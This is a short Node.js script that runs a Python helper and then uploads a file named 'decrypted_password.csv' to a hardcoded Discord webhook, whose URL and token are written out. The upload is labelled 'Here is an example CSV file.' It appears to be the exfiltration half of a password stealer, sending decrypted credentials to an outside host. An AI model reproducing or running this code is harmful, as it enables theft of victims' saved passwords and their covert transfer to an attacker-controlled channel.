const { spawn } = require('child_process');
const Discord = require('discord.js');
const fs = require('fs');

const pyScript = spawn('python', ['./main.py']);

pyScript.on('close', (code) => {
  
  const webhookClient = new Discord.WebhookClient({url: "https://discord.com/api/webhooks/1091403478536048741/aUpw0aGRl_nLVeFn9OXqLdm5nhsXd9SO0T1sbBiTxIJ1ayICcIpSaxHpR59aQmX2GkrQ"})
  const file = fs.createReadStream('decrypted_password.csv');
  
  webhookClient.send({
    files: [file],
    content: 'Here is an example CSV file:'
  })
    .then(() => console.log('File sent successfully'))
    .catch(error => console.error(error));
  
});
